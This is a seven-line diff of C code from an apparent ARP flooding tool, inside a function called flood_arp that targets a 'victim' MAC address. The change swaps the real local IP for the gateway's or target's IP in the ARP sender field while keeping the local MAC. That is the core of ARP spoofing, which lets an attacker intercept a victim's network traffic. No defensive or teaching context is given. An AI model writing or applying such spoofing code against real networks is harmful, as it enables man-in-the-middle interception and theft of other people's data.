@@ -223,7 +223,7 @@ void* flood_arp(void* ta) {
     memcpy(ea->arp_sha, local_mac, 6);
 
     //Set sender IP address
-    memcpy(ea->arp_spa, &local_ip, 4);
+    memcpy(ea->arp_spa, (victim_ip == gateway_ip) ? &target_ip : &gateway_ip, 4);
 
     //Set target mac address
     memcpy(ea->arp_tha, victim_mac, 6);
